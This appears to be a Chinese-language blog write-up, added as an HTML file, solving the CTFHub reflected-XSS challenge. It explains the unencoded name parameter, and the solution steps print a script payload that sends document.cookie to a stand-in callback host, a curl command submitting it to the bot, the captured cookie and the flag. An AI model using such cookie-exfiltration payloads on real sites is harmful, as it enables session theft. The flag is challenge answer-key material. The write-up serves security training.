@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub XSS 反射型 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - XSS - 反射型</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># XSS</span>
+            <span class="tag"># 反射型</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>XSS Reflex（反射型 XSS）</li>
+            <li><strong>题目方向：</strong>Web - XSS - 反射型</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>利用反射型 XSS 执行前端脚本，获取 Bot Cookie 中的 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>访问根路径时服务端返回 <code>302</code>，并跳转到 <code>/?name=CTFHub</code>。页面的回显位置如下：</p>
+        <pre>&lt;div&gt;
+    &lt;h1&gt;Hello, CTFHub
+    &lt;/h1&gt;
+&lt;/div&gt;</pre>
+        <p>使用 <code>name</code> 参数提交测试内容后，参数值会未经 HTML 实体编码直接拼接到 <code>&lt;h1&gt;</code> 标签内，因此可以闭合当前文本节点并注入由浏览器执行的脚本。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>验证反射点：</strong>访问根路径并跟随重定向，确认页面接收并回显 <code>name</code> 参数。
+                <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/?name=CTFHub"</pre>
+            </li>
+            <li>
+                <strong>验证脚本执行：</strong>提交以下 Payload，响应源码中可以看到 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 被原样写回页面：
+                <pre>&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+                对应 URL 参数需要进行 URL 编码：
+                <pre>%3Cscript%3Ealert(1)%3C%2Fscript%3E</pre>
+            </li>
+            <li>
+                <strong>确认 Bot 提交接口：</strong>页面底部的 <code>Send URL to Bot</code> 功能向 <code>/submit</code> 发送 JSON 请求，请求格式如下：
+                <pre>POST /submit
+Content-Type: application/json
+
+{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/?name=..."}</pre>
+                Bot 使用 HeadlessChrome 访问提交的 URL，Flag 保存在 Bot 当前域的 Cookie 中。仅使用 <code>alert(document.cookie)</code> 无法把结果带回攻击端，因此需要使用公网回调地址外带 Cookie。
+            </li>
+            <li>
+                <strong>构造外带 Payload：</strong>启动临时回调服务，将 <code>document.cookie</code> 编码后作为查询参数发送到回调地址：
+                <pre>&lt;script&gt;location='https://your-callback.example/?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</pre>
+            </li>
+            <li>
+                <strong>提交给 Bot：</strong>把包含 Payload 的完整 URL 进行参数编码，然后向 <code>/submit</code> 提交：
+                <pre>$payload = 'http://challenge-xxx.sandbox.ctfhub.com:10800/?name=' + [uri]::EscapeDataString("&lt;script&gt;location='https://your-callback.example/?c='+encodeURIComponent(document.cookie)&lt;/script&gt;")
+$body = @{ url = $payload } | ConvertTo-Json -Compress
+
+curl.exe -X POST "http://challenge-xxx.sandbox.ctfhub.com:10800/submit" `
+  -H "Content-Type: application/json" `
+  --data-binary $body</pre>
+                接口返回：
+                <pre>{
+  "code": 0,
+  "msg": "Successfully"
+}</pre>
+            </li>
+            <li>
+                <strong>读取回调数据：</strong>Bot 成功执行脚本后，回调请求中出现经过 URL 编码的 Cookie：
+                <pre>GET /?c=flag%3Dctfhub%7B5362d16889b05693d7e41999%7D</pre>
+                解码查询参数即可得到 Flag。
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{5362d16889b05693d7e41999}
+        </div>
+
+        <h2>五、解题总结</h2>
+        <ul>
+            <li><strong>反射型 XSS 的入口：</strong>用户输入被服务端原样拼接到 HTML 中，且缺少输出编码，是最典型的反射型 XSS 成因。</li>
+            <li><strong>注意攻击链：</strong>当敏感数据只存在于 Bot 会话中时，需要结合 Bot 访问与外部回调完成数据外带，单纯弹窗不能取得 Flag。</li>
+            <li><strong>双层 URL 编码：</strong>Payload 首先作为 <code>name</code> 参数编码，随后完整 URL 再作为 JSON 中 <code>url</code> 字段提交，构造时应注意编码层级。</li>
+            <li><strong>修复建议：</strong>对用户输入执行上下文相关的 HTML 编码；避免将不可信数据直接拼接到 HTML 标签内容中，并结合 CSP 降低 XSS 风险。</li>
+        </ul>
+    </div>
+</body>
+</html>
